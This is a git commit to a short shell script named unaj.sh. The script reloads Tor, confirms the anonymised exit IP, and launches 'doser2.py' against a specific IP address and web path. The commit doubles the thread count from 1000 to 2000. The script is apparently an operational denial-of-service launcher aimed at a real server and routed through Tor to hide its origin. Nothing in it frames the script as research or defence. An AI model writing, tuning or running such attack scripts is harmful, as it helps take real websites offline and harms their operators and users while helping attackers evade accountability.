4d58ba56f659dccf3ef2237659bde7b9cb4c3333
Carabaya <94078994+Carabaya@users.noreply.github.com>
2022-08-20 16:59:28 -0500

    Update unaj.sh

--- unaj.sh
+++ unaj.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 service tor reload &>/dev/null
 curl --socks5 127.0.0.1:9050 ip.p3terx.com
-python3 doser2.py -g 'http://51.222.105.32/avunaj2/lib/requirejs.php/1633383650/core/first.js' -t 1000
+python3 doser2.py -g 'http://51.222.105.32/avunaj2/lib/requirejs.php/1633383650/core/first.js' -t 2000
